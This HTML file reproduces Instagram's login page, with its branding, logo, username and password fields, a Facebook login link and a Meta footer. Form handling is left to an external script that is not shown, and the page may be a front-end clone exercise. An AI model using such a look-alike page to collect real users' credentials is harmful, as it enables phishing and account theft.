<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="icon" href="/home page/img/1409946.png" type="image/x-icon" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
      integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      href="https://cdn.jsdelivr.net/npm/remixicon@4.1.0/fonts/remixicon.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="container">
      <img src="/home page/img/home-phones.png" alt="" class="phone" />
      <img src="/home page/img/screenshot4.png" alt="" class="content" />

      <form id="loginForm">
        <img src="/home page/img/instagram.svg" alt="" class="logo" />
        <input
          type="text"
          id="user"
          placeholder="Phone number,username, or email"
          required
          class="user"
        />
        <input
          type="password"
          id="pass"
          placeholder="Password"
          required
          class="pass"
        />
        <button class="btn" type="submit">Log in</button>
        <div class="line"></div>
        <h5>OR</h5>
        <div class="line1"></div>

        <i class="ri-facebook-box-fill"></i>
        <h2><a href="http://Facebook.com">Log in with Facebook</a></h2>
        <p>Forgot Password?</p>
      </form>

      <div class="signup">
        <p class="sign">Don't have an account? <span>Sign up</span></p>
      </div>

      <h6>Get the app.</h6>
      <img src="/home page/img/c5Rp7Ym-Klz.png" alt="" class="play" />
      <img src="/home page/img/EHY6QnZYdNX.png" alt="" class="micro" />
    </div>

    <ul class="list">
      <li>Meta</li>
      <li>About</li>
      <li>Blog</li>
      <li>Job</li>
      <li>Help</li>
      <li>Privacy</li>
      <li>Api</li>
      <li>Terms</li>
      <li>Location</li>
      <li>Instagram</li>
      <li>Threads</li>
      <li>Contact Uploading & New user</li>
      <li>Meta Verified</li>
    </ul>

    <select id="language">
      <option value="en">English</option>
      <option value="es">Español</option>
      <option value="fr">Français</option>
      <option value="de">Deutsch</option>
      <!-- Add more language options as needed -->
    </select>
    <footer>© 2024 Instagram from Meta</footer>
    <script src="script.js"></script>
  </body>
</html>
